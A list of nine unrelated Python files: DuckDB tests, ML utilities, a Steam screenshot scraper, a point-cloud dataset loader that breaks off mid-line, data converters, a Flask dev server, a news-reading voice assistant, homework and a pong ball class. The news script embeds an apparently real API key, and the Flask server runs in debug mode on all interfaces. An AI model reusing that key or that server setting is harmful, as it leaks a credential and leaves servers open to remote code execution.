    "import pytest\nimport os\nimport duckdb\nfrom unittest.mock import patch, Mock\nfrom regdbot.brain import dbtools as dbt\n\n\n@pytest.fixture\ndef memdb():\n    return duckdb.connect()\n\ntmp_path = pytest.fixture(lambda: './fixtures')\n\n\n\n# def test_get_table_description():\n#     table_name = 'startrek_table'\n#     conn = sqlgen.get_duckdb_connection('duckdb:///:memory:')\n#     query1 = f\"CREATE TABLE {table_name} as SELECT * FROM read_csv('fixtures/Star_Trek-Season_1.csv');\"\n#\n#     conn.execute(query1)\n#     result = dbt.get_table_description(conn, table_name)\n#\n#     assert 'season_num' in result[0]\n#     assert 'episode_num' in result[1]\n\ndef test_get_csv_description_from_url():\n    file_path = 'https://blobs.duckdb.org/data/Star_Trek-Season_1.csv'\n    result = dbt.get_csv_description(file_path)\n    assert 'season_num' in result[0]\n    assert 'episode_num' in result[1]\n\ndef test_get_csv_description_from_file():\n    file_path = 'fixtures/Star_Trek-Season_1.csv'\n    result = dbt.get_csv_description(file_path)\n    assert 'season_num' in result[0]\n    assert 'episode_num' in result[1]\n\ndef test_database_connection_with_duckdb_url():\n    with patch('regdbot.brain.dbtools.get_duckdb_connection') as mock_get_duckdb_connection:\n        db = dbt.Database('duckdb:///:memory:')\n        db.connection\n        mock_get_duckdb_connection.assert_called_once_with('duckdb:///:memory:')\n\ndef test_database_connection_with_postgresql_url():\n    with patch('sqlalchemy.create_engine') as mock_create_engine:\n        mock_engine = Mock()\n        mock_create_engine.return_value = mock_engine\n        db = dbt.Database('postgresql://localhost/test')\n        db.connection\n        mock_create_engine.assert_called_once_with('postgresql://localhost/test')\n        mock_engine.connect.assert_called_once()\n\ndef test_database_connection_with_unsupported_url():\n    with patch('loguru.logger.error') as mock_error:\n        db = dbt.Database('unsupported://localhost/test')\n        db.connection\n        mock_error.assert_called_once_with('Database URL unsupported://localhost/test not supported.')\n\ndef test_get_table_description():\n    with patch.object(dbt.Database, 'connection') as mock_connection:\n        mock_execute = Mock()\n        mock_connection.execute.return_value = mock_execute\n        db = dbt.Database('duckdb:///:memory:')\n        db.get_table_description('table_name')\n        mock_execute.execute.assert_called_once_with('DESCRIBE SELECT * FROM table_name;')",
    "import numpy as np\nimport torch\nimport pickle\nimport random\nimport os\nimport json\n\n\nclass StandardScaler:\n    \"\"\"\n    Standard the input\n    https://github.com/nnzhan/Graph-WaveNet/blob/master/util.py\n    \"\"\"\n\n    def __init__(self, mean=None, std=None):\n        self.mean = mean\n        self.std = std\n\n    def fit_transform(self, data):\n        self.mean = data.mean()\n        self.std = data.std()\n\n        return (data - self.mean) / self.std\n\n    def transform(self, data):\n        return (data - self.mean) / self.std\n\n    def inverse_transform(self, data):\n        return (data * self.std) + self.mean\n\n\ndef masked_mae_loss(preds, labels, null_val=0.0):\n    if np.isnan(null_val):\n        mask = ~torch.isnan(labels)\n    else:\n        mask = labels != null_val\n    mask = mask.float()\n    mask /= torch.mean((mask))\n    mask = torch.where(torch.isnan(mask), torch.zeros_like(mask), mask)\n    loss = torch.abs(preds - labels)\n    loss = loss * mask\n    loss = torch.where(torch.isnan(loss), torch.zeros_like(loss), loss)\n    return torch.mean(loss)\n\n\nclass MaskedMAELoss:\n    def _get_name(self):\n        return self.__class__.__name__\n\n    def __call__(self, preds, labels, null_val=0.0):\n        return masked_mae_loss(preds, labels, null_val)\n\n\ndef print_log(*values, log=None, end=\"\\n\"):\n    print(*values, end=end)\n    if log:\n        if isinstance(log, str):\n            log = open(log, \"a\")\n        print(*values, file=log, end=end)\n        log.flush()\n\n\ndef load_pickle(pickle_file):\n    try:\n        with open(pickle_file, \"rb\") as f:\n            pickle_data = pickle.load(f)\n    except UnicodeDecodeError as e:\n        with open(pickle_file, \"rb\") as f:\n            pickle_data = pickle.load(f, encoding=\"latin1\")\n    except Exception as e:\n        print(\"Unable to load data \", pickle_file, \":\", e)\n        raise\n    return pickle_data\n\n\ndef seed_everything(seed):\n    random.seed(seed)\n    os.environ[\"PYTHONHASHSEED\"] = str(seed)\n    np.random.seed(seed)\n    torch.manual_seed(seed)\n    torch.cuda.manual_seed(seed)\n    torch.cuda.manual_seed_all(seed)  # multi-GPU\n    # torch.backends.cudnn.deterministic = True\n    # torch.backends.cudnn.benchmark = False\n\n\ndef set_cpu_num(cpu_num: int):\n    os.environ[\"OMP_NUM_THREADS\"] = str(cpu_num)\n    os.environ[\"OPENBLAS_NUM_THREADS\"] = str(cpu_num)\n    os.environ[\"MKL_NUM_THREADS\"] = str(cpu_num)\n    os.environ[\"VECLIB_MAXIMUM_THREADS\"] = str(cpu_num)\n    os.environ[\"NUMEXPR_NUM_THREADS\"] = str(cpu_num)\n    torch.set_num_threads(cpu_num)\n\n\nclass CustomJSONEncoder(json.JSONEncoder):\n    def default(self, obj):\n        if isinstance(obj, np.integer):\n            return int(obj)\n        elif isinstance(obj, np.floating):\n            return float(obj)\n        elif isinstance(obj, np.ndarray):\n            return f\"Shape: {obj.shape}\"\n        elif isinstance(obj, torch.device):\n            return str(obj)\n        else:\n            return super(CustomJSONEncoder, self).default(obj)\n\n\ndef vrange(starts, stops):\n    \"\"\"Create ranges of integers for multiple start/stop\n\n    Parameters:\n        starts (1-D array_like): starts for each range\n        stops (1-D array_like): stops for each range (same shape as starts)\n        \n        Lengths of each range should be equal.\n\n    Returns:\n        numpy.ndarray: 2d array for each range\n        \n    For example:\n\n        >>> starts = [1, 2, 3, 4]\n        >>> stops  = [4, 5, 6, 7]\n        >>> vrange(starts, stops)\n        array([[1, 2, 3],\n               [2, 3, 4],\n               [3, 4, 5],\n               [4, 5, 6]])\n\n    Ref: https://codereview.stackexchange.com/questions/83018/vectorized-numpy-version-of-arange-with-multiple-start-stop\n    \"\"\"\n    stops = np.asarray(stops)\n    l = stops - starts  # Lengths of each range. Should be equal, e.g. [12, 12, 12, ...]\n    assert l.min() == l.max(), \"Lengths of each range should be equal.\"\n    indices = np.repeat(stops - l.cumsum(), l) + np.arange(l.sum())\n    return indices.reshape(-1, l[0])\n\n\ndef print_model_params(model):\n    param_count = 0\n    for name, param in model.named_parameters():\n        if param.requires_grad:\n            print(\"%-40s\\t%-30s\\t%-30s\" % (name, list(param.shape), param.numel()))\n            param_count += param.numel()\n    print(\"%-40s\\t%-30s\" % (\"Total trainable params\", param_count))\n",
    "# \u0417\u0430\u0432\u0430\u043d\u0442\u0430\u0436\u0443\u0454\u043c\u043e \u0431\u0456\u0431\u043b\u0456\u043e\u0442\u0435\u043a\u0438 \u0443 \u043f\u043e\u0442\u043e\u0447\u043d\u043e\u043c\u0443 \u0441\u0435\u0440\u0435\u0434\u043e\u0432\u0438\u0449\u0456\r\nimport tkinter as tk\r\nfrom tkinter import messagebox\r\nimport os\r\nfrom selenium import webdriver\r\nfrom selenium.webdriver.chrome.options import Options\r\nimport time\r\n\r\ndef download_page():\r\n    # \u041e\u0442\u0440\u0438\u043c\u0443\u0454\u043c\u043e URL \u0437 \u0442\u0435\u043a\u0441\u0442\u043e\u0432\u043e\u0433\u043e \u043f\u043e\u043b\u044f\r\n    url = url_entry.get()\r\n    \r\n    # \u0406\u043d\u0456\u0446\u0456\u0430\u043b\u0456\u0437\u0443\u0454\u043c\u043e \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u0438 \u0434\u043b\u044f \u0432\u0435\u0431-\u0434\u0440\u0430\u0439\u0432\u0435\u0440\u0430 Chrome (headless mode)\r\n    chrome_options = Options()\r\n    chrome_options.add_argument(\"--headless\")\r\n    chrome_options.add_argument(\"--disable-gpu\")\r\n    driver = webdriver.Chrome(options=chrome_options)\r\n    \r\n    #\u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f\r\n    print(\"Loading page and scraping HTML... It will take quite some time, if you have a lot of screenshots there...\")\r\n    print(\"Be patient. It is doing it.\")\r\n\r\n    try:\r\n        # \u0412\u0456\u0434\u043a\u0440\u0438\u0432\u0430\u0454\u043c\u043e \u0432\u0435\u0431-\u0441\u0442\u043e\u0440\u0456\u043d\u043a\u0443\r\n        driver.get(url)\r\n\r\n                \r\n        # \u041e\u0442\u0440\u0438\u043c\u0443\u0454\u043c\u043e \u0432\u0438\u0441\u043e\u0442\u0443 \u0441\u0442\u043e\u0440\u0456\u043d\u043a\u0438\r\n        last_height = driver.execute_script(\"return document.body.scrollHeight\")\r\n        \r\n        # \u0427\u0435\u043a\u0430\u0454\u043c\u043e, \u0434\u043e\u043a\u0438 \u0441\u0442\u043e\u0440\u0456\u043d\u043a\u0430 \u043d\u0435 \u0437\u0430\u0432\u0430\u043d\u0442\u0430\u0436\u0438\u0442\u044c\u0441\u044f \u043f\u043e\u0432\u043d\u0456\u0441\u0442\u044e\r\n        while True:\r\n            # \u041f\u0440\u043e\u043a\u0440\u0443\u0447\u0443\u0454\u043c\u043e \u0432\u043d\u0438\u0437 \u0434\u043e \u043a\u0456\u043d\u0446\u044f \u0441\u0442\u043e\u0440\u0456\u043d\u043a\u0438\r\n            driver.execute_script(\"window.scrollTo(0, document.body.scrollHeight);\")\r\n            \r\n            # \u0427\u0435\u043a\u0430\u0454\u043c\u043e \u0434\u0435\u044f\u043a\u0438\u0439 \u0447\u0430\u0441 \u0434\u043b\u044f \u0437\u0430\u0432\u0430\u043d\u0442\u0430\u0436\u0435\u043d\u043d\u044f \u043d\u043e\u0432\u0438\u0445 \u0435\u043b\u0435\u043c\u0435\u043d\u0442\u0456\u0432\r\n            time.sleep(2)\r\n            \r\n            # \u041e\u0431\u0447\u0438\u0441\u043b\u044e\u0454\u043c\u043e \u043d\u043e\u0432\u0443 \u0432\u0438\u0441\u043e\u0442\u0443 \u0441\u0442\u043e\u0440\u0456\u043d\u043a\u0438 \u043f\u0456\u0441\u043b\u044f \u043f\u0440\u043e\u043a\u0440\u0443\u0442\u043a\u0438\r\n            new_height = driver.execute_script(\"return document.body.scrollHeight\")\r\n            \r\n            # \u042f\u043a\u0449\u043e \u043d\u043e\u0432\u0430 \u0432\u0438\u0441\u043e\u0442\u0430 \u0441\u0442\u043e\u0440\u0456\u043d\u043a\u0438 \u043d\u0435 \u0437\u043c\u0456\u043d\u0438\u043b\u0430\u0441\u044f, \u0446\u0435 \u043e\u0437\u043d\u0430\u0447\u0430\u0454, \u0449\u043e \u0432\u0441\u0456 \u0435\u043b\u0435\u043c\u0435\u043d\u0442\u0438 \u0437\u0430\u0433\u0440\u0443\u0436\u0435\u043d\u0456\r\n            if new_height == last_height:\r\n                break\r\n                \r\n            last_height = new_height\r\n        \r\n        # \u041e\u0442\u0440\u0438\u043c\u0443\u0454\u043c\u043e HTML-\u043a\u043e\u0434 \u0437\u0430\u0432\u0430\u043d\u0442\u0430\u0436\u0435\u043d\u043e\u0457 \u0441\u0442\u043e\u0440\u0456\u043d\u043a\u0438\r\n        html_source = driver.page_source\r\n        \r\n        # \u0417\u0430\u043a\u0440\u0438\u0432\u0430\u0454\u043c\u043e \u0432\u0435\u0431-\u0434\u0440\u0430\u0439\u0432\u0435\u0440\r\n        driver.quit()\r\n        \r\n\r\n         # \u0417\u0431\u0435\u0440\u0456\u0433\u0430\u0454\u043c\u043e HTML-\u043a\u043e\u0434 \u0443 \u0444\u0430\u0439\u043b \"sample.html\" \u0432 \u043f\u0430\u043f\u0446\u0456 scripts\r\n        with open(\"scripts/temp/sample.html\", \"w\", encoding=\"utf-8\") as file:\r\n            file.write(html_source)\r\n\r\n        \r\n        # \u041f\u043e\u0447\u0435\u043a\u0430\u0454\u043c\u043e 3 \u0441\u0435\u043a\u0443\u043d\u0434\u0438\r\n        time.sleep(3)\r\n        \r\n        # \u0417\u0430\u043f\u0443\u0441\u043a\u0430\u0454\u043c\u043e proceed.bat\r\n        os.system(\"start proceed.bat\")\r\n        \r\n        # \u0417\u0430\u043a\u0440\u0438\u0432\u0430\u0454\u043c\u043e \u0432\u0456\u043a\u043d\u043e tkinter\r\n        root.destroy()\r\n        \r\n    except Exception as e:\r\n        messagebox.showerror(\"Error\", str(e))\r\n\r\n# \u0421\u0442\u0432\u043e\u0440\u044e\u0454\u043c\u043e \u0432\u0456\u043a\u043d\u043e tkinter\r\nroot = tk.Tk()\r\nroot.title(\"Web Page Downloader\")\r\n\r\n# \u0414\u043e\u0434\u0430\u0454\u043c\u043e \u043f\u043e\u043b\u0435 \u0434\u043b\u044f \u0432\u0432\u0435\u0434\u0435\u043d\u043d\u044f URL\r\nurl_label = tk.Label(root, text=\"Enter screenshot page URL (https://steamcommunity.com/id/YOUR_ID/screenshots/):\")\r\nurl_label.pack(pady=5)\r\nurl_entry = tk.Entry(root, width=50)\r\nurl_entry.pack(pady=5)\r\n\r\n# \u0414\u043e\u0434\u0430\u0454\u043c\u043e \u043a\u043d\u043e\u043f\u043a\u0443 \"OK\"\r\nok_button = tk.Button(root, text=\"Confirm\", command=download_page)\r\nok_button.pack(pady=10)\r\n\r\n# \u0417\u0430\u043f\u0443\u0441\u043a\u0430\u0454\u043c\u043e \u0433\u043e\u043b\u043e\u0432\u043d\u0438\u0439 \u0446\u0438\u043a\u043b \u0432\u0456\u043a\u043d\u0430 tkinter\r\nroot.mainloop()\r\n",
    "import os\nimport abc\nimport torch\nimport numpy as np\nimport open3d as o3d\nfrom utils.utils import (\n    random_rotation_matrix, \n    read_pickle)\n\ndef make_non_exists_dir(fn):\n    if not os.path.exists(fn):\n        os.makedirs(fn)\n        \nclass EvalDataset(abc.ABC):\n    @abc.abstractmethod\n    def get_pair_ids(self):\n        pass\n\n    @abc.abstractmethod\n    def get_cloud_ids(self):\n        pass\n\n    @abc.abstractmethod\n    def get_pc_dir(self,cloud_id):\n        pass\n    \n    @abc.abstractmethod\n    def get_key_dir(self,cloud_id):\n        pass\n\n    @abc.abstractmethod\n    def get_transform(self,id0,id1):\n        # note the order!\n        # target: id0, source: id1\n        # R @ pts1 + t = pts0\n        pass\n\n    @abc.abstractmethod\n    def get_name(self):\n        pass\n\n    @abc.abstractmethod\n    def get_kps(self,cloud_id):\n        pass\n\n#The dataset class for original/ground truth datas\nclass SceneDataset(EvalDataset):\n    def __init__(self,root_dir,stationnum,gt_dir=None):\n        self.root=root_dir\n        if gt_dir==None:\n            self.gt_dir=f'{self.root}/PointCloud/gt.log'\n        else:\n            self.gt_dir=gt_dir\n        self.kps_pc_fn=[f'{self.root}/Keypoints_PC/cloud_bin_{k}Keypoints.npy' for k in range(stationnum)]\n        self.kps_fn=[f'{self.root}/Keypoints/cloud_bin_{k}Keypoints.txt' for k in range(stationnum)]\n        self.pc_ply_paths=[f'{self.root}/PointCloud/cloud_bin_{k}.ply' for k in range(stationnum)]\n        self.pc_txt_paths=[f'{self.root}/PointCloud/cloud_bin_{k}.txt' for k in range(stationnum)]\n        self.pair_id2transform=self.parse_gt_fn(self.gt_dir)\n        self.pair_ids=[tuple(v.split('-')) for v in self.pair_id2transform.keys()]\n        self.pc_ids=[str(k) for k in range(stationnum)]\n        self.pair_num=self.get_pair_nums()\n        self.name='3dmatch/kitchen'\n\n    #function for gt(input: gt.log)\n    @staticmethod\n    def parse_gt_fn(fn):\n        with open(fn,'r') as f:\n            lines=f.readlines()\n            pair_num=len(lines)//5\n            pair_id2transform={}\n            for k in range(pair_num):\n                id0,id1=np.fromstring(lines[k*5],dtype=np.float32,sep='\\t')[0:2]\n                id0=int(id0)\n                id1=int(id1)\n                row0=np.fromstring(lines[k*5+1],dtype=np.float32,sep=' ')\n                row1=np.fromstring(lines[k*5+2],dtype=np.float32,sep=' ')\n                row2=np.fromstring(lines[k*5+3],dtype=np.float32,sep=' ')\n                transform=np.stack([row0,row1,row2],0)\n                pair_id2transform['-'.join((str(id0),str(id1)))]=transform\n\n            return pair_id2transform\n\n    def get_pair_ids(self):\n        return self.pair_ids\n\n    def get_pair_nums(self):\n        return len(self.pair_ids)\n\n    def get_cloud_ids(self):\n        return self.pc_ids\n\n    def get_pc_dir(self,cloud_id):\n        return self.pc_ply_paths[int(cloud_id)]\n\n    def get_pc(self,pc_id):\n        if os.path.exists(self.pc_ply_paths[int(pc_id)]):\n            pc=o3d.io.read_point_cloud(self.pc_ply_paths[int(pc_id)])\n            return np.array(pc.points)\n        else:\n            pc=np.loadtxt(self.pc_paths[int(pc_id)],delimiter=',')\n            return pc\n    \n    def get_pc_o3d(self,pc_id):\n        return o3d.io.read_point_cloud(self.pc_ply_paths[int(pc_id)])\n            \n    def get_key_dir(self,cloud_id):\n        return self.kps_fn[int(cloud_id)]\n\n    def get_transform(self, id0, id1):\n        return self.pair_id2transform['-'.join((id0,id1))]\n\n    def get_name(self):\n        return self.name\n\n    def get_kps(self, cloud_id):\n        if not os.path.exists(self.kps_pc_fn[int(cloud_id)]):\n            pc=self.get_pc(cloud_id)\n            key_idxs=np.loadtxt(self.kps_fn[int(cloud_id)]).astype(np.int)\n            keys=pc[key_idxs]\n            make_non_exists_dir(f'{self.root}/Keypoints_PC')\n            np.save(self.kps_pc_fn[int(cloud_id)],keys)\n            return keys\n        return np.load(self.kps_pc_fn[int(cloud_id)])\n\n#Get dataset items with the dataset name(output: dict)\ndef get_dataset_name(dataset_name,origin_data_dir):\n    if dataset_name=='demo':\n        datasets={}\n        datasets['wholesetname']=f'{dataset_name}'\n        scenes=[\"kitchen\"]\n        stationnums=[60]\n\n        for i in range(len(scenes)):\n            root_dir=f'{origin_data_dir}/{dataset_name}/'+scenes[i]\n            datasets[scenes[i]]=SceneDataset(root_dir,stationnums[i])\n            datasets[scenes[i]].name=f'{dataset_name}/{scenes[i]}'\n        return datasets\n\n    if dataset_name=='3dmatch':\n        datasets={}\n        datasets['wholesetname']=f'{dataset_name}'\n        scenes=[\"kitchen\",\"sun3d-home_at-home_at_scan1_2013_jan_1\",\n        \"sun3d-home_md-home_md_scan9_2012_sep_30\",\"sun3d-hotel_uc-scan3\",\n        \"sun3d-hotel_umd-maryland_hotel1\",\"sun3d-hotel_umd-maryland_hotel3\",\n        \"sun3d-mit_76_studyroom-76-1studyroom2\",\"sun3d-mit_lab_hj-lab_hj_tea_nov_2_2012_scan1_erika\"]\n        stationnums=[60,60,60,55,57,37,66,38]\n\n        for i in range(len(scenes)):\n            ro",
    "import json\r\nimport tablib\r\nimport time\r\n\r\n# json.text\u6587\u4ef6\u7684\u683c\u5f0f\uff1a [{\"a\":1},{\"a\":2},{\"a\":3},{\"a\":4},{\"a\":5}]\r\n\r\n# \u83b7\u53d6\uff4a\uff53\uff4f\uff4e\u6570\u636e\r\nwith open('sum.json', 'r') as f:\r\n    rows = json.load(f)\r\n\r\n# \u5c06json\u4e2d\u7684key\u4f5c\u4e3aheader, \u4e5f\u53ef\u4ee5\u81ea\u5b9a\u4e49header\uff08\u5217\u540d\uff09\r\nheader=tuple([ i for i in rows[0].keys()])\r\n\r\ndata = []\r\n# \u5faa\u73af\u91cc\u9762\u7684\u5b57\u5178\uff0c\u5c06value\u4f5c\u4e3a\u6570\u636e\u5199\u5165\u8fdb\u53bb\r\nfor row in rows:\r\n    body = []\r\n    for v in row.values():\r\n        body.append(v)\r\n    data.append(tuple(body))\r\n\r\ndata = tablib.Dataset(*data,headers=header)\r\n\r\nopen('haha1.xls', 'wb').write(data.xls)\r\n\r\n\r\n\r\nimport pandas as pd\r\n\r\ndf = pd.read_excel(r'haha1.xls')#\u9ed8\u8ba4\u8bfb\u53d6\u5de5\u4f5c\u7c3f\u4e2d\u7b2c\u4e00\u4e2a\u5de5\u4f5c\u8868\uff0c\u9ed8\u8ba4\u7b2c\u4e00\u884c\u4e3a\u8868\u5934\r\ndata=df.values#\u83b7\u53d6\u6574\u4e2a\u5de5\u4f5c\u8868\u6570\u636e\r\nwith open('end.json','w')as f:\r\n    f.write('[')\r\n\r\n\r\n    for i in range(len(data)-1):\r\n        for j in range(len(data[i][0])):\r\n            if data[i][0][j]!= '[' and data[i][0][j]!= ']':\r\n                f.write((data[i][0][j]))\r\n        f.write(',')\r\n        f.write('\\n')\r\n    for i in range(len(data[(len(data))-1][0])):\r\n        if data[(len(data))-1][0][i] != '[' and data[(len(data))-1][0][(len(data))] != ']':\r\n            f.write((data[(len(data))-1][0][i]))\r\n\r\n\r\n\r\n\r\n\r\n\r\nlist1=[]\r\na = json.load(open(\"end.json\", encoding='utf8'))\r\nfor i in range(0,len(a)-1,2):\r\n    x1=a[i]['name']\r\n    y1=a[i]['value']\r\n    x2=a[i+1]['name']\r\n    y2=a[i+1]['value']\r\n    dic={}\r\n    dic[x1]=y1\r\n    dic[x2]=y2\r\n    list1.append(dic)\r\nwith open('end.json','w')as f:\r\n    for i in range(len(str(list1))):\r\n        if str(list1)[i]==\"'\":\r\n            f.write('\"')\r\n            continue\r\n        f.write(str(list1)[i])\r\n\r\n\r\n\r\n\r\n\r\n\r\n# \u83b7\u53d6\uff4a\uff53\uff4f\uff4e\u6570\u636e\r\nwith open('end.json', 'r') as f:\r\n    rows = json.load(f)\r\n\r\n# \u5c06json\u4e2d\u7684key\u4f5c\u4e3aheader, \u4e5f\u53ef\u4ee5\u81ea\u5b9a\u4e49header\uff08\u5217\u540d\uff09\r\nheader=tuple([ i for i in rows[0].keys()])\r\n\r\ndata = []\r\n# \u5faa\u73af\u91cc\u9762\u7684\u5b57\u5178\uff0c\u5c06value\u4f5c\u4e3a\u6570\u636e\u5199\u5165\u8fdb\u53bb\r\nfor row in rows:\r\n    body = []\r\n    for v in row.values():\r\n        body.append(v)\r\n    data.append(tuple(body))\r\n\r\ndata = tablib.Dataset(*data,headers=header)\r\nt=time.localtime()\r\nyear=t.tm_year\r\nmon=t.tm_mon\r\nday=t.tm_mday\r\nhour=t.tm_hour\r\nmin=t.tm_min\r\nsec=t.tm_sec\r\nopen(f'{year};{mon};{day};{hour};{min};{sec}.xls', 'wb').write(data.xls)",
    "try:\n    # try to import flask, or return error if has not been installed\n    from flask import Flask\n    from flask import send_from_directory\nexcept ImportError:\n    print(\"You don't have Flask installed, run `$ pip3 install flask` and try again\")\n    exit(1)\n\nimport os, subprocess\n\nstatic_file_dir = os.path.join(os.path.dirname(os.path.realpath(__file__)), './')\napp = Flask(__name__)\napp.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0 #disable cache\n\n# Serving the index file\n@app.route('/', methods=['GET'])\ndef serve_dir_directory_index():\n    if os.path.exists(\"app.py\"):\n        # if app.py exists we use the render function\n        out = subprocess.Popen(['python3','app.py'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)\n        stdout,stderr = out.communicate()\n        return stdout if out.returncode == 0 else f\"<pre style='color: red;'>{stdout.decode('utf-8')}</pre>\"\n    if os.path.exists(\"index.html\"):\n        return send_from_directory(static_file_dir, 'index.html')\n    else:\n        return \"<h1 align='center'>404</h1><h2 align='center'>Missing index.html file</h2><p align='center'><img src='https://github.com/4GeeksAcademy/html-hello/blob/main/.vscode/rigo-baby.jpeg?raw=true' /></p>\"\n\n# Serving any other image\n@app.route('/<path:path>', methods=['GET'])\ndef serve_any_other_file(path):\n    if not os.path.isfile(os.path.join(static_file_dir, path)):\n        path = os.path.join(path, 'index.html')\n    response = send_from_directory(static_file_dir, path)\n    response.cache_control.max_age = 0 # avoid cache memory\n    return response\n\napp.run(host='0.0.0.0',port=3000, debug=True, extra_files=['./',])\n",
    "import requests\r\nimport json\r\nimport pyttsx3\r\n\r\nengine = pyttsx3.init(\"sapi5\")\r\nvoices = engine.getProperty(\"voices\")\r\nengine.setProperty(\"voice\", voices[0].id)\r\nrate = engine.setProperty(\"rate\",170)\r\n\r\ndef speak(audio):\r\n    engine.say(audio)\r\n    engine.runAndWait()\r\n\r\ndef latestnews():\r\n    api_dict = {\"business\" : \"https://newsapi.org/v2/top-headlines?country=in&category=business&apiKey=b42c22c8291a4bb785836de733013d14\"\r\n,\r\n            \"entertainment\" : \"https://newsapi.org/v2/top-headlines?country=in&category=entertainment&apiKey=b42c22c8291a4bb785836de733013d14\"\r\n,\r\n            \"health\" : \"https://newsapi.org/v2/top-headlines?country=in&category=health&apiKey=b42c22c8291a4bb785836de733013d14\",\r\n            \"science\" :\"https://newsapi.org/v2/top-headlines?country=in&category=science&apiKey=b42c22c8291a4bb785836de733013d14\"\r\n,\r\n            \"sports\" :\"https://newsapi.org/v2/top-headlines?country=in&category=sports&apiKey=b42c22c8291a4bb785836de733013d14\"\r\n,\r\n            \"technology\" :\"https://newsapi.org/v2/top-headlines?country=in&category=technology&apiKey=b42c22c8291a4bb785836de733013d14\"\r\n    }\r\n\r\n\r\n    content = None\r\n    url = None\r\n    speak(\"Which field news do you want, [business] , [health] , [technology], [sports] , [entertainment] , [science]\")\r\n    field = input(\"Type field news that you want: \")\r\n    for key ,value in api_dict.items():\r\n        if key.lower() in field.lower():\r\n            url = value\r\n            print(url)\r\n            print(\"url was found\")\r\n            break\r\n        else:\r\n            url = True\r\n    if url is True:\r\n        print(\"url not found\")\r\n\r\n    news = requests.get(url).text\r\n    news = json.loads(news)\r\n    speak(\"Here is the first news.\")\r\n\r\n    arts = news[\"articles\"]\r\n    for articles in arts :\r\n        article = articles[\"title\"]\r\n        print(article)\r\n        speak(article)\r\n        news_url = articles[\"url\"]\r\n        print(f\"for more info visit: {news_url}\")\r\n\r\n        a = input(\"[press 1 to cont] and [press 2 to stop]\")\r\n        if str(a) == \"1\":\r\n            pass\r\n        elif str(a) == \"2\":\r\n            break\r\n        \r\n    speak(\"thats all\")\r\n    import winsound\r\n    duration = 1000  # milliseconds\r\n    freq = 440  # Hz\r\n    winsound.Beep(freq, duration)\r\n\r\n",
    "# -*- coding: utf-8 -*-\n\"\"\"Processing1.ipynb\n\nAutomatically generated by Colaboratory.\n\nOriginal file is located at\n    https://colab.research.google.com/drive/1K1n4ZoWXQQeNJmqR-PAGxKC45X4XhGZv\n\"\"\"\n\n# Vivian Luu\n# 2/16/2024\n# An if decsision is a decsion that will either run specific code or not if a condition is met.\n# An if else decision is a decsion that can run different sets of code based on whether or not the condition is met.\n# A condition is a statement we can use to make decisions. The condition could be whether a variable is above, below, or equal to a number or even a combination of those.\n# A different condition could be whether the varible is or is not the type you're looking for. There can also be multiple conditions that need to be met.\n# Using if and if else, we can use the conditions to make decisions which will decide whether to run a block of code, or which blocks of code to run.\n# Using a while loop, we can use the condion to make a decision on whether or not to keep repeating the loop.\n# The key differences between a while loop and a for loop is how we control how long they repeat. In a for loop, you can tell the loop how many repetitions it does.\n# This can be done with a variable or manually putting a number. In a while loop the loop will continue repeating until a condition is met or it can go on infinitely.\n\n#Problem 1\n\nx = input(\"Please type an integer, x is\")\ny = input(\"Please type another integer, y is\")\nif x > y:\n  print(\"X is larger than Y\")\n\n#Problem 2\n\nx = input(\"Please type an integer, x is\")\ny = input(\"Please type another integer, y is\")\nif x > y:\n  print(\"X is larger than Y\")\nelse:\n  print(\"Y is larger than X\")\n\n#Problem 3\n\nx = input(\"Please type an integer, x = \")\ny = input(\"Please type another integer, y = \")\nif x > y:\n  print(\"X is larger than Y\")\nelif y > x:\n  print(\"Y is larger than X\")\nelse:\n  print(\"X and Y are equal\")\n\n#Problem 4\n\nn = 0\nwhile n < 100:\n  n += 1\n  print(n)\n\nn = 101\nwhile n > 1:\n  n -= 1\n  print(n)\n\n#Problem 5\n\nfor n in (range(1,101,1)):\n  print(n)\n\nfor n in (range(100,0,-1)):\n  print(n)\n\n#Problem 6\n\nfor n in (range(10,101)):\n  print(n)\n\n#Problem 7\n\nfor n in (range(10,110,10)):\n  print(n)\n\n#Problem 8\n\nlst = [\"Bob\", \"Smith\", \"1234 Noplace Street\", \"Nowhere\", \"UT\", \"8499\"]\nfor n in lst:\n  print(n)\n\n#Problem 9\n\nage = input(\"Please type your age: \")\nage = int(age)\nwhile age < 1 or age > 125:\n  age = input(\"Please type your actual age: \")\n  age = int(age)\nprint(\"Your age was:\",age)",
    "import pygame\r\nimport math\r\nimport random\r\n\r\n\r\nclass Ball:\r\n    MAX_VEL = 5\r\n    RADIUS = 7\r\n\r\n    def __init__(self, x, y):\r\n        self.x = self.original_x = x\r\n        self.y = self.original_y = y\r\n        \r\n        angle = self._get_random_angle(-30, 30, [0])\r\n        pos = 1 if random.random() < 0.5 else -1\r\n\r\n        self.x_vel = pos * abs(math.cos(angle) * self.MAX_VEL)\r\n        self.y_vel = math.sin(angle) * self.MAX_VEL\r\n\r\n    def _get_random_angle(self, min_angle, max_angle, excluded):\r\n        angle = 0\r\n        while angle in excluded:\r\n            angle = math.radians(random.randrange(min_angle, max_angle))\r\n\r\n        return angle\r\n\r\n    def draw(self, win):\r\n        pygame.draw.circle(win, (255, 255, 255), (self.x, self.y), self.RADIUS)\r\n\r\n    def move(self):\r\n        self.x += self.x_vel\r\n        self.y += self.y_vel\r\n\r\n    def reset(self):\r\n        self.x = self.original_x\r\n        self.y = self.original_y\r\n\r\n        angle = self._get_random_angle(-30, 30, [0])\r\n        x_vel = abs(math.cos(angle) * self.MAX_VEL)\r\n        y_vel = math.sin(angle) * self.MAX_VEL\r\n\r\n        self.y_vel = y_vel\r\n        self.x_vel *= -1\r\n",
